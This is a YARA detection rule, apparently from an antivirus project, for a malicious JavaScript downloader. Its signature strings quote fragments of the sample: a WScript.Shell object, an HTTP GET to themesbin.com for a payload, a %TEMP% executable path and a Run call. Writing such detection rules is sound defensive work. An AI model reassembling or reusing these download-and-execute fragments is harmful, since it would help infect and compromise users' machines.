rule sig_20160328_5f717c0a02e234f2497ad32d81f09de2 {
  meta:
    description = "datamaliciousorder - file 20160328_5f717c0a02e234f2497ad32d81f09de2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3b315843018096b4f35f43caf2bd76e00b25ddab97fbef2d2a29e573aec3676e"

  strings:
    $s1  = "function Dmpnmsrwlv() {return Goowisvs[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"HEgNaXXYNB.exe\";};" fullword ascii
    $s2  = "Kdpgr[Zzlfl](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s3  = "do {WScript[Wandkqppy](Ouhzyvr() * 11)} while (Kdpgr[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Nqdxox(Ktbfjsinae, Djbrdljba){return Ktbfjsinae - Djbrdljba;};" fullword ascii
    $s5  = "var Goowisvs = function Fptis() {return WScript[Asfvliayo](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Kmqgniiskr(Lhmmgm){Goowisvs[\"Run\"](Lhmmgm, Hcuugwg, Hcuugwg);};" fullword ascii
    $s7  = "function Nexpl() {return ((Woiudvmq == true) && (Woiudvmq == Lsuap)) ? 1 : Hcuugwg;};" fullword ascii
    $s8  = "var Lsuap = false;" fullword ascii
    $s9  = " while (Hbshbrz){" fullword ascii
    $s10 = "var Hpeewjsu = new this[\"Date\"]();" fullword ascii
    $s11 = "function Eiuuaczgu(){return Asfvliayo;};" fullword ascii
    $s12 = "var Woiudvmq = false;" fullword ascii
    $s13 = "var Dncdhj = false;" fullword ascii
    $s14 = "function Cmnljfvtg(){return Ormtvfbxiz;};" fullword ascii
    $s15 = "Woiudvmq = true; " fullword ascii
    $s16 = "function Kpdaywpj()" fullword ascii
    $s17 = "Lsuap = true; " fullword ascii
    $s18 = "function Pgpojjb(Kmhjtddl) {var Bstngqrkt = (1, 2, 3, 4, 5, Kmhjtddl); return Bstngqrkt;};" fullword ascii
    $s19 = "return Nqdxox(Avvtkqjbwy, Oqknpmssj);" fullword ascii
    $s20 = "function Ouhzyvr(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}